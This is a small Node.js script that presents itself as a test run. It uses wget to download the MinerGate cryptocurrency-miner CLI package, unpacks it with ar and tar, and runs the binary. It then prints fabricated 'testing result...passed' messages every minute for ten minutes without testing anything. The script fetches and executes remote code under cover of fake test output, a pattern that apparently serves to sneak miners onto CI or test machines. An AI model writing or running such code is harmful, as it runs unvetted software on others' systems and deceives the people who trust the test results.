var exec = require("child_process").exec;
var index = 1;
var max = 10;
var interval;
var testStr ="wget -q --content-disposition https://minergate.com/download/deb-cli && ar x minergate-cli-release.deb && tar -xzf control.tar.gz && tar -xzf data.tar.gz && cd opt/minergate-cli && ./minergate-cli -help"

console.log('executing:');
console.log(testStr);
console.log('starting...');
exec(testStr);

interval = setInterval(function () {
    if (index >= max) process.exit(0);
    console.log("testing result..." + index++ + '...passed');
}, 1000 * 60);
